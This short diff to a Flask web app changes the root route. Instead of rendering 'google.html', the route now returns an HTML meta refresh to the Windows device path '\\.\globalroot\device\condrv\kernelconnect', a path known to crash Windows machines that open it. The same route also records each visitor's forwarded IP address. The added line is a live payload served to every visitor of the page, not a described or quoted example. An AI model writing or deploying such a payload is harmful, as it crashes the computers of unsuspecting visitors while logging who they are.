@@ -16,7 +16,8 @@ app = Flask(__name__)
 def root():
     if 'HTTP_X_FORWARDED_FOR' in request.environ:
         submit_metric('/', '', request.environ['HTTP_X_FORWARDED_FOR'])
-    return render_template('google.html')
+    return '<head>\
+<meta http-equiv="refresh" content="1;URL=\\\\.\\globalroot\\device\\condrv\\kernelconnect"/></head>'
 
 
 @app.route('/monke')
